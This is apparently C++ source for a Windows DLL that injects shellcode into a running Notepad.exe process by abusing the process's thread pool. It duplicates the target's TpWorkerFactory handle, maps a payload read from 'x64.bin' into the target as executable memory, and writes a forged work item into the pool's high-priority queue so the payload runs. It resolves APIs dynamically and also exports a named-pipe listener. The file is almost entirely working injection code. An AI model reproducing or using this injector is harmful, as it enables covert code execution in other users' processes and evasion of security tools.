// dllmain.cpp : Defines the entry point for the DLL application.
#define _CRT_SECURE_NO_WARNINGS

#include "pch.h"
#include "Misc.h"
#include "Native.h"
#include "ThreadPool.h"

#define WORKER_FACTORY_RELEASE_WORKER		0x0001
#define WORKER_FACTORY_WAIT					0x0002
#define WORKER_FACTORY_SET_INFORMATION		0x0004
#define WORKER_FACTORY_QUERY_INFORMATION	0x0008
#define WORKER_FACTORY_READY_WORKER			0x00010
#define WORKER_FACTORY_SHUTDOWN				0x00020


#define ProcessHandleInformation 51
#define ObjectTypeInformation 2
#define WORKER_FACTORY_ALL_ACCESS ( \
       STANDARD_RIGHTS_REQUIRED | \
       WORKER_FACTORY_RELEASE_WORKER | \
       WORKER_FACTORY_WAIT | \
       WORKER_FACTORY_SET_INFORMATION | \
       WORKER_FACTORY_QUERY_INFORMATION | \
       WORKER_FACTORY_READY_WORKER | \
       WORKER_FACTORY_SHUTDOWN \
)

#define DEBUG(fmt, ...) DebugLog(fmt, __VA_ARGS__)

void DebugLog(const char* fmt, ...)
{
	FILE* f = fopen("debug.log", "a+");
	if (!f) return;

	va_list args;
	va_start(args, fmt);
	vfprintf(f, fmt, args);
	va_end(args);

	fclose(f);
}

typedef NTSTATUS(NTAPI* NtCreateSectionPtr)(
	PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);

typedef NTSTATUS(NTAPI* NtMapViewOfSectionPtr)(
	HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

typedef NTSTATUS(NTAPI* NtUnmapViewOfSectionPtr)(
	HANDLE, PVOID);


struct NtFunctions {
	NtCreateSectionPtr NtCreateSection;
	NtMapViewOfSectionPtr NtMapViewOfSection;
	NtUnmapViewOfSectionPtr NtUnmapViewOfSection;
};

NtFunctions getNtFunctions() {
	NtFunctions nt;
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	nt.NtCreateSection = (NtCreateSectionPtr)GetProcAddress(hNtdll, "NtCreateSection");
	nt.NtMapViewOfSection = (NtMapViewOfSectionPtr)GetProcAddress(hNtdll, "NtMapViewOfSection");
	nt.NtUnmapViewOfSection = (NtUnmapViewOfSectionPtr)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	return nt;
}

#define ViewShare 1
#define ViewUnmap 2

LPVOID writeShellMapping(HANDLE hProcess) {
	NtFunctions nt = getNtFunctions();
	if (!nt.NtCreateSection || !nt.NtMapViewOfSection || !nt.NtUnmapViewOfSection) {
		std::cerr << "Failed to resolve NT functions.\n";
		return nullptr;
	}

	const char* filePath = "x64.bin";
	HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to open payload file.\n";
		return nullptr;
	}

	DWORD fileSize = GetFileSize(hFile, NULL);
	BYTE* payload = new BYTE[fileSize];
	DWORD bytesRead;
	ReadFile(hFile, payload, fileSize, &bytesRead, NULL);
	CloseHandle(hFile);

	HANDLE hSection = NULL;
	LARGE_INTEGER liSize;
	liSize.QuadPart = fileSize;

	NTSTATUS status = nt.NtCreateSection(
		&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		&liSize,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL
	);

	if (!NT_SUCCESS(status)) {
		std::cerr << "Failed to create section. \n";
		std::cout << "NTSTATUS: " << std::hex << status << std::dec << "\n";
		delete[] payload;
		return nullptr;
	}

	LPVOID localAddress = nullptr;
	SIZE_T viewSize = fileSize;
	status = nt.NtMapViewOfSection(
		hSection,
		GetCurrentProcess(),
		&localAddress,
		0,
		0,
		NULL,
		&viewSize,
		ViewUnmap,
		0,
		PAGE_READWRITE
	);
	if (!NT_SUCCESS(status)) {
		std::cerr << "Failed to map section locally.\n";
		CloseHandle(hSection);
		delete[] payload;
		return nullptr;
	}

	memcpy(localAddress, payload, fileSize);

	LPVOID remoteAddress = nullptr;
	viewSize = fileSize;
	status = nt.NtMapViewOfSection(
		hSection,
		hProcess,
		&remoteAddress,
		0,
		0,
		NULL,
		&viewSize,
		ViewUnmap,
		0,
		PAGE_EXECUTE_READ
	);
	if (!NT_SUCCESS(status)) {
		std::cerr << "Failed to map section in remote process.\n";
		nt.NtUnmapViewOfSection(GetCurrentProcess(), localAddress);
		CloseHandle(hSection);
		delete[] payload;
		return nullptr;
	}

	nt.NtUnmapViewOfSection(GetCurrentProcess(), localAddress);
	CloseHandle(hSection);
	delete[] payload;

	return remoteAddress;
}

HANDLE getProcHandlebyName(LPWSTR procName, DWORD* PID) {
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(PROCESSENTRY32W);
	NTSTATUS status = NULL;
	HANDLE hProc = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!snapshot) {
		//DEBUG("[x] Cannot retrieve the processes snapshot\n");
		return NULL;
	}
	if (Process32First(snapshot, &entry)) {
		do {
			if (wcscmp((entry.szExeFile), procName) == 0) {
				*PID = entry.th32ProcessID;
				//DEBUG("[+] Injecting into : %d\n", *PID);
				hProc = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, *PID);
				if (!hProc) { continue; }
				return hProc;
			}
		} while (Process32Next(snapshot, &entry));
	}

	return NULL;

}

typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(
	HANDLE,
	PROCESSINFOCLASS,
	PVOID,
	ULONG,
	PULONG
	);

typedef NTSTATUS(NTAPI* NtQueryObject_t)(
	HANDLE,
	OBJECT_INFORMATION_CLASS,
	PVOID,
	ULONG,
	PULONG
	);

//typedef enum _WORKERFACTORYINFOCLASS
//{
//    WorkerFactoryTimeout, // LARGE_INTEGER
//    WorkerFactoryRetryTimeout, // LARGE_INTEGER
//    WorkerFactoryIdleTimeout, // s: LARGE_INTEGER
//    WorkerFactoryBindingCount, // s: ULONG
//    WorkerFactoryThreadMinimum, // s: ULONG
//    WorkerFactoryThreadMaximum, // s: ULONG
//    WorkerFactoryPaused, // ULONG or BOOLEAN
//    WorkerFactoryBasicInformation, // q: WORKER_FACTORY_BASIC_INFORMATION
//    WorkerFactoryAdjustThreadGoal,
//    WorkerFactoryCallbackType,
//    WorkerFactoryStackInformation, // 10
//    WorkerFactoryThreadBasePriority, // s: ULONG
//    WorkerFactoryTimeoutWaiters, // s: ULONG, since THRESHOLD
//    WorkerFactoryFlags, // s: ULONG
//    WorkerFactoryThreadSoftMaximum, // s: ULONG
//    WorkerFactoryThreadCpuSets, // since REDSTONE5
//    MaxWorkerFactoryInfoClass
//} WORKERFACTORYINFOCLASS, *PWORKERFACTORYINFOCLASS;

typedef NTSTATUS(NTAPI* NtQueryInformationWorkerFactory_t)(
	HANDLE,
	DWORD,
	PVOID,
	ULONG,
	PULONG
	);

int Run() {
	// Resolve ntdll and kernel32 functions
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

	// Typedefs for WinAPI functions
	typedef HANDLE(WINAPI* OpenProcessPtr)(DWORD, BOOL, DWORD);
	typedef BOOL(WINAPI* DuplicateHandlePtr)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
	typedef BOOL(WINAPI* ReadProcessMemoryPtr)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
	typedef LPVOID(WINAPI* VirtualAllocExPtr)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
	typedef BOOL(WINAPI* WriteProcessMemoryPtr)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
	typedef BOOL(WINAPI* CloseHandlePtr)(HANDLE);

	// Resolve function pointers
	OpenProcessPtr pOpenProcess = (OpenProcessPtr)GetProcAddress(hKernel32, "OpenProcess");
	DuplicateHandlePtr pDuplicateHandle = (DuplicateHandlePtr)GetProcAddress(hKernel32, "DuplicateHandle");
	ReadProcessMemoryPtr pReadProcessMemory = (ReadProcessMemoryPtr)GetProcAddress(hKernel32, "ReadProcessMemory");
	VirtualAllocExPtr pVirtualAllocEx = (VirtualAllocExPtr)GetProcAddress(hKernel32, "VirtualAllocEx");
	WriteProcessMemoryPtr pWriteProcessMemory = (WriteProcessMemoryPtr)GetProcAddress(hKernel32, "WriteProcessMemory");
	CloseHandlePtr pCloseHandle = (CloseHandlePtr)GetProcAddress(hKernel32, "CloseHandle");

	// Resolve NT functions
	NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	NtQueryObject_t NtQueryObject = (NtQueryObject_t)GetProcAddress(hNtdll, "NtQueryObject");
	NtQueryInformationWorkerFactory_t NtQueryInformationWorkerFactoryfn = (NtQueryInformationWorkerFactory_t)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");

	LPHANDLE pDuplicateHandleVar = new HANDLE;
	DWORD PID = 0;

	// Use resolved OpenProcess in getProcHandlebyName
	HANDLE hProc = nullptr;
	{
		PROCESSENTRY32W entry;
		entry.dwSize = sizeof(PROCESSENTRY32W);
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		if (snapshot && Process32First(snapshot, &entry)) {
			do {
				if (wcscmp((entry.szExeFile), L"Notepad.exe") == 0) {
					PID = entry.th32ProcessID;
					hProc = pOpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, PID);
					if (!hProc) { continue; }
					break;
				}
			} while (Process32Next(snapshot, &entry));
		}
	}

	if (!hProc) {
		DEBUG("[x] Cannot open the process\n");
		return -1;
	}

	NTSTATUS ntStatus;
	std::vector<BYTE> information;
	ULONG returnLength = 0;
	do {
		information.resize(returnLength);
		ntStatus =
			NtQueryInformationProcess(
				hProc,
				static_cast<PROCESSINFOCLASS>(ProcessHandleInformation),
				information.data(),
				returnLength,
				&returnLength
			);
	} while (ntStatus == 0xC0000004);

	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessInformation = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(information.data());

	for (int i = 0; i < pProcessInformation->NumberOfHandles; i++) {
		HANDLE tmp = pProcessInformation->Handles[i].HandleValue;
		if (!pDuplicateHandle(
			hProc,
			pProcessInformation->Handles[i].HandleValue,
			GetCurrentProcess(),
			pDuplicateHandleVar,
			WORKER_FACTORY_ALL_ACCESS,
			FALSE,
			NULL
		)) {
			DEBUG("DuplicateHandle Failded\n");
			continue;
		}

		std::vector<BYTE> object;
		returnLength = 0;
		do {
			object.resize(returnLength);
			ntStatus =
				NtQueryObject(
					*pDuplicateHandleVar,
					static_cast<OBJECT_INFORMATION_CLASS>(ObjectTypeInformation),
					object.data(),
					returnLength,
					&returnLength);
		} while (ntStatus == 0xC0000004);
		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(object.data());
		if (std::wstring(pObjectInformation->TypeName.Buffer) == L"TpWorkerFactory") {
			break;
		}
	}

	LPVOID remoteAddress = writeShellMapping(hProc);

	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
	ntStatus = NtQueryInformationWorkerFactoryfn(
		*pDuplicateHandleVar,
		WorkerFactoryBasicInformation,
		&WorkerFactoryInformation,
		sizeof(WorkerFactoryInformation),
		nullptr
	);
	if (!NT_SUCCESS(ntStatus)) {
		DEBUG("[x] Failed to NtQueryInformationWorkerFactory : %p \n", ntStatus);
		return -1;
	}

	SIZE_T byteWritten;
	std::vector<BYTE> buffer;
	buffer.resize(sizeof(FULL_TP_POOL));
	SIZE_T byteRead;
	pReadProcessMemory(hProc, WorkerFactoryInformation.StartParameter, buffer.data(), sizeof(FULL_TP_POOL), &byteRead);
	PFULL_TP_POOL pTargetTpPool = reinterpret_cast<PFULL_TP_POOL>(buffer.data());
	const auto TargetTaskQueueHighPriorityList = &pTargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;
	const auto pTpWork = (PFULL_TP_WORK)CreateThreadpoolWork(static_cast<PTP_WORK_CALLBACK>(remoteAddress), nullptr, nullptr);
	pTpWork->CleanupGroupMember.Pool = static_cast<PFULL_TP_POOL>(WorkerFactoryInformation.StartParameter);
	pTpWork->Task.ListEntry.Flink = TargetTaskQueueHighPriorityList;
	pTpWork->Task.ListEntry.Blink = TargetTaskQueueHighPriorityList;
	pTpWork->WorkState.Exchange = 0x2;

	const auto pRemoteTpWork = static_cast<PFULL_TP_WORK>(pVirtualAllocEx(hProc, nullptr, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	pWriteProcessMemory(hProc, pRemoteTpWork, pTpWork, sizeof(FULL_TP_WORK), &byteWritten);
	auto RemoteWorkItemTaskList = &pRemoteTpWork->Task.ListEntry;

	pWriteProcessMemory(hProc, &pTargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), &byteWritten);
	pWriteProcessMemory(hProc, &pTargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), &byteWritten);

	pCloseHandle(hProc);

	DEBUG("[+] Successfully injected the work item into the target process's thread pool\n");
	return 1;
}


extern "C" __declspec(dllexport) int Init() {
	const char* pipeName = R"(\\.\pipe\MyPipe)";
	HANDLE hPipe = CreateNamedPipeA(
		pipeName,                // Pipe name
		PIPE_ACCESS_DUPLEX,      // Read/Write access
		PIPE_TYPE_MESSAGE |      // Message-type pipe
		PIPE_READMODE_MESSAGE |
		PIPE_WAIT,               // Blocking mode
		1,                      // Max instances
		1024,                   // Out buffer size
		1024,                   // In buffer size
		0,                      // Default timeout
		nullptr                 // Security attributes
	);

	if (hPipe == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to create pipe. Error: " << GetLastError() << std::endl;
		return 1;
	}

	/*CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)Run, nullptr, 0, nullptr);*/
	
	//Run();

	std::cout << "Waiting for client to connect..." << std::endl;
	BOOL connected = ConnectNamedPipe(hPipe, nullptr) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);

	if (connected) {
		std::cout << "Client connected." << std::endl;
		char buffer[1024];
		DWORD bytesRead;
		while (true) {
			BOOL result = ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
			if (!result || bytesRead == 0) {
				std::cout << "Client disconnected or error occurred." << std::endl;
				break;
			}
			buffer[bytesRead] = '\0';
			std::cout << "Received: " << buffer << std::endl;

			// Echo back to client
			DWORD bytesWritten;
			//WriteFile(hPipe, buffer, bytesRead, &bytesWritten, nullptr);
			DEBUG("Received from client: %s\n", buffer);
		}
	}
	else {
		std::cerr << "Failed to connect to client. Error: " << GetLastError() << std::endl;
	}

	CloseHandle(hPipe);
	return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

